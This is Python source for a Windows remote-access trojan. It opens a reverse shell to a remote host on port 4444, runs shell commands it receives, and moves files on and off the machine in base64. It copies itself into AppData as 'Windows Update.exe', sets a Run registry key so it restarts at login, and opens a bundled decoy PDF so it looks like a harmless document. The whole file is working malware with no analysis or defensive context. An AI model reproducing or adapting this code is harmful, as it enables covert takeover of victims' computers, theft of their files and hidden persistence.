import socket
import subprocess
import json
import os
import base64
from urllib2 import urlopen, URLError, HTTPError
import time
from random import randint
import urllib2
import sys
import shutil
import smtplib
import bs4
import requests


class App:
    def __init__( self, ip, port ):
        self.connection = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        self.connection.connect( ( ip, port ) )

    def reliable_send( self, data ):
        json_data = json.dumps( data )
        self.connection.send( json_data )

    def reliable_receive( self ):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv( 1024 )
                return json.loads( json_data )
            except ValueError:
                continue

    def run_cmd( self, _cmd ):
        DEVNULL = open( os.devnull, 'wb' )
        return subprocess.check_output( _cmd , shell = True, stderr=DEVNULL, stdin=DEVNULL )

    
    def change_dir( self, path ):
        os.chdir( path )
        return "[+] changing dir to " + path
    
    def read_file( self, path ):
        with open( path, "rb" ) as file:
            return base64.b64encode( file.read() )

    def write_file( self, path, content ):
        with open( path, "wb") as file:
            file.write( base64.b64decode( content ) )
            return "[+] upload successful" 

    def main( self ):
        while True:
            cmd = self.reliable_receive()
            try:
                if cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif cmd[0] == "cd" and len( cmd ) > 1:
                    res = self.change_dir( cmd[1] )
                elif cmd[0] == "download":
                    res = self.read_file( cmd[1] )
                elif cmd[0] == "upload":
                    res = self.write_file( cmd[1], cmd[2] )
                else:    
                    res = self.run_cmd( cmd )
            except Exception:
                res = "[-] Error during cmd execution"
            self.reliable_send( res )



def relocate():
        location = os.environ["appdata"] + "\\Windows Update.exe"
        if not os.path.exists( location ):
            shutil.copyfile( sys.executable , location )
            subprocess.call( 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True )

relocate()

file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen( file_name , shell=True )


try:
    app = App( "" + ip + "", 4444 )
    app.main()              
except Exception:
    time.sleep( randint( 1000 , 2000) )    


